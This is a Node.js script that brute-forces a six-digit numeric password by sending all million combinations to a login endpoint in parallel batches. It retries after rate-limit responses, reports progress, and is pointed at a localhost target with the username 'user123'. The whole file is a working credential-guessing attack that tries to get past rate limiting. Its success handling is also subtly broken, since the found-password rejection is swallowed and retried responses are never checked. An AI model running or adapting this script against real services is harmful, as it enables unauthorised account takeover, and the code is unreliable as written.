const axios = require('axios');
const { performance } = require('perf_hooks');

async function crackPassword(baseUrl, username) {
    const startTime = performance.now();
    let passwordFound = false;
    let password = null;
    let attempts = 0;
    const totalAttempts = 1000000; 

    const generatePasswordAttempts = (start, end) => {
        const promises = [];
        for (let i = start; i <= end; i++) {
            let currentPassword = i.toString().padStart(6, '0');
            const promise = axios.post(`${baseUrl}/login`, {
                username,
                password: currentPassword
            }).then(response => {
                if (response.data.status === 'success') {
                    passwordFound = true;
                    password = currentPassword;
                    return Promise.reject(new Error('Password Found')); 
                }
            }).catch(error => {
                if (error.response && error.response.status === 429) {
                    console.log('Rate limited, retrying...');
                    return new Promise(resolve => setTimeout(resolve, 10000)).then(() => {
                        return axios.post(`${baseUrl}/login`, {
                            username,
                            password: currentPassword
                        });
                    });
                }
                return null; 
            });
            attempts++;
            promises.push(promise);
        }
        return promises;
    };

    try {
        const chunkSize = 100;
        for (let i = 0; i <= 999999; i += chunkSize) {
            if (passwordFound) break; 
            await Promise.all(generatePasswordAttempts(i, Math.min(i + chunkSize - 1, 999999)));
            if ((i % 2000) == 0){
                const progressPercentage = ((i + chunkSize) / totalAttempts * 100).toFixed(2); 
                console.log(`Progress: ${progressPercentage}% completed`);
            }
            
        }
    } catch (error) {
        if (error.message !== 'Password Found') {
            console.error('An error occurred:', error);
        }
    }

    const endTime = performance.now();
    const duration = ((endTime - startTime) / 1000).toFixed(2); 
    console.log(`Process completed in ${duration} seconds.`);
    if (passwordFound) {
        console.log(`Password found: ${password}`);
    } else {
        console.log('Password not found.');
    }
}
crackPassword('http://localhost:8080', 'user123');
